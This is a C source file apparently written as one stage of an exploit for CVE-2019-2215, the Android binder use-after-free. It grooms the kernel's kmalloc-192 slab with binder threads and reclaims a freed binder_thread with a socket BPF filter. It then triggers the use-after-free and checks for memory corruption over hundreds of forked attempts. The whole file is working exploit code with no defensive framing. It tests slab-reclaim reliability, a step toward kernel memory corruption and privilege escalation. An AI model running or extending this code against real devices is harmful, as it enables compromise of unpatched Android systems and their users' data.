/*
 * bpf_reclaim_v4.c — CVE-2019-2215 reclaim via binder_thread grooming
 *
 * KEY INSIGHT: sk_filter is freed via call_rcu (DEFERRED), but binder_thread
 * is freed via kfree (IMMEDIATE). Previous tests used BPF for slab grooming,
 * but RCU-deferred free means the objects don't actually return to the per-CPU
 * freelist in time. Binder_thread grooming uses immediate kfree → reliable LIFO.
 *
 * Strategy:
 * 1. Create N binder_threads (fills k192 per-CPU freelist with fresh objects)
 * 2. Free all N (kfree → all go to per-CPU freelist, LIFO order)
 * 3. Allocate target binder_thread (takes from top of LIFO = last freed)
 * 4. Free target (kfree → goes to top of LIFO)
 * 5. SO_ATTACH_FILTER → kmalloc from k192 → should get target's slot
 * 6. close(epfd) → UAF trigger
 *
 * Detection: BPF filter at insns[3] has RET_K k=0 (DROP).
 * After UAF list_del: insns[3].k = heap addr, and spin_unlock changes
 * code from RET_K(1) to RET_A(2). RET_A returns A=42 → ACCEPT.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

#define MAX_GROOM 300

static int do_test(int attempt, int groom_count) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    /* Pre-create detection socket FIRST (before any binder ops) */
    int det_sock = socket(AF_INET, SOCK_DGRAM, 0);
    int sender = socket(AF_INET, SOCK_DGRAM, 0);
    if (det_sock < 0 || sender < 0) return -1;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(0x7F000001);
    addr.sin_port = htons(20000 + (attempt % 10000));
    if (bind(det_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) return -1;
    
    struct timeval tv = { .tv_sec = 0, .tv_usec = 100000 };
    setsockopt(det_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    /* === PHASE 1: Binder_thread grooming ===
     * Create groom_count binder_threads to populate k192 per-CPU freelist.
     * Each: open binder → mmap → epoll_ctl ADD → creates thread via binder_poll.
     * No BC_ENTER_LOOPER (so binder_poll creates thread with NEED_RETURN). */
    int groom_bfd[MAX_GROOM], groom_epfd[MAX_GROOM];
    for (int i = 0; i < groom_count; i++) {
        groom_bfd[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (groom_bfd[i] < 0) { groom_count = i; break; }
        uint32_t mx = 0;
        ioctl(groom_bfd[i], BINDER_SET_MAX_THREADS, &mx);
        groom_epfd[i] = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(groom_epfd[i], EPOLL_CTL_ADD, groom_bfd[i], &ev);
    }
    
    /* === PHASE 2: Free ALL groom threads ===
     * BINDER_THREAD_EXIT → kfree(thread) → immediate per-CPU freelist.
     * Free in reverse order so first-freed is deepest in LIFO. */
    for (int i = groom_count - 1; i >= 0; i--) {
        int thr = 0;
        ioctl(groom_bfd[i], BINDER_THREAD_EXIT, &thr);
    }
    /* Close epoll fds (epoll cleanup touches freed memory but spinlock=0 → safe) */
    for (int i = groom_count - 1; i >= 0; i--) {
        close(groom_epfd[i]);
    }
    
    /* === PHASE 3: Create TARGET binder_thread ===
     * This should take from the per-CPU freelist (one of the recently freed slots).
     * It's now on the same slab page as the freed groom threads. */
    int target_bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (target_bfd < 0) {
        for (int i = 0; i < groom_count; i++) close(groom_bfd[i]);
        close(det_sock); close(sender);
        return -1;
    }
    uint32_t mx = 0;
    ioctl(target_bfd, BINDER_SET_MAX_THREADS, &mx);
    int target_epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(target_epfd, EPOLL_CTL_ADD, target_bfd, &ev);
    
    /* === PHASE 4: Free TARGET thread ===
     * kfree → goes to TOP of per-CPU LIFO freelist. */
    int thr = 0;
    ioctl(target_bfd, BINDER_THREAD_EXIT, &thr);
    
    /* === PHASE 5: IMMEDIATELY reclaim with BPF ===
     * This kmalloc should get the target's slot (LIFO).
     * 20 instructions × 8 bytes + header = k192.
     * insns[3]: code=RET_K(→internal 1), jt=1, jf=0, k=0
     *   At offset 44: u32=0x00010001 → ticket lock UNLOCKED */
    struct sock_filter det_insns[20];
    memset(det_insns, 0, sizeof(det_insns));
    for (int j = 0; j < 3; j++) {
        det_insns[j].code = 0x00; /* LD_IMM */
        det_insns[j].k = 42;     /* A = 42 */
    }
    det_insns[3].code = 0x06;    /* RET_K */
    det_insns[3].jt = 1;         /* next ticket = 1 */
    det_insns[3].jf = 0;
    det_insns[3].k = 0;          /* return 0 = DROP */
    det_insns[4].code = 0x06;    /* backup for header=12 case */
    det_insns[4].jt = 1;
    det_insns[4].jf = 0;
    det_insns[4].k = 0;
    for (int j = 5; j < 19; j++) {
        det_insns[j].code = 0x06;
        det_insns[j].k = 0;
    }
    det_insns[19].code = 0x06;
    det_insns[19].k = 0xFFFF;
    
    struct sock_fprog det_prog = { .len = 20, .filter = det_insns };
    if (setsockopt(det_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                   &det_prog, sizeof(det_prog)) < 0) {
        close(target_epfd); close(target_bfd);
        for (int i = 0; i < groom_count; i++) close(groom_bfd[i]);
        close(det_sock); close(sender);
        return -2;
    }
    
    /* Verify: packet should be DROPPED (RET k=0) */
    char pre[] = "PRE";
    sendto(sender, pre, sizeof(pre), 0, (struct sockaddr*)&addr, sizeof(addr));
    char buf[64];
    ssize_t pre_got = recv(det_sock, buf, sizeof(buf), 0);
    if (pre_got > 0) {
        close(target_epfd); close(target_bfd);
        for (int i = 0; i < groom_count; i++) close(groom_bfd[i]);
        close(det_sock); close(sender);
        return -3; /* filter not dropping */
    }
    
    /* === PHASE 6: UAF TRIGGER === */
    close(target_epfd);
    
    /* === PHASE 7: Detection === */
    char test[] = "UAFTEST!";
    sendto(sender, test, sizeof(test), 0, (struct sockaddr*)&addr, sizeof(addr));
    ssize_t got = recv(det_sock, buf, sizeof(buf), 0);
    
    int result = (got > 0) ? 1 : 0;
    
    /* Cleanup */
    close(det_sock); close(sender);
    close(target_bfd);
    for (int i = 0; i < groom_count; i++) close(groom_bfd[i]);
    
    return result;
}

int main() {
    printf("=== CVE-2019-2215 BPF Reclaim v4 (binder_thread grooming) ===\n");
    printf("Using binder_threads for grooming (kfree, not call_rcu)\n\n");
    
    int test_configs[][2] = {
        {0,   500},  /* No groom */
        {50,  500},  /* Light groom */
        {200, 500},  /* Heavy groom */
    };
    char *labels[] = {"No groom", "50 binder groom", "200 binder groom"};
    
    for (int t = 0; t < 3; t++) {
        int groom = test_configs[t][0];
        int attempts = test_configs[t][1];
        printf("--- %s, %d attempts ---\n", labels[t], attempts);
        
        int detected = 0, errors = 0, filter_bad = 0, hangs = 0;
        for (int i = 0; i < attempts; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(4);
                int r = do_test(i, groom);
                _exit(r < 0 ? 200 + (-r) : r);
            }
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status)) {
                int code = WEXITSTATUS(status);
                if (code == 1) {
                    detected++;
                    if (detected <= 3)
                        printf("  [%d] *** DETECTED! UAF corruption confirmed! ***\n", i);
                } else if (code == 203) {
                    filter_bad++;
                } else if (code >= 200) {
                    errors++;
                }
            } else if (WIFSIGNALED(status)) {
                int sig = WTERMSIG(status);
                if (sig == 14) hangs++;
                else errors++;
            }
            
            if ((i+1) % 100 == 0)
                printf("  [%d/%d] detected=%d hangs=%d errors=%d\n",
                       i+1, attempts, detected, hangs, errors);
        }
        printf("  TOTAL: %d/%d detected, %d hangs, %d errors, %d filter_bad\n\n",
               detected, attempts, hangs, errors, filter_bad);
        
        if (detected > 0) {
            printf("!!! UAF CONFIRMED EXPLOITABLE !!!\n");
            break;
        }
    }
    
    printf("=== Done ===\n");
    return 0;
}
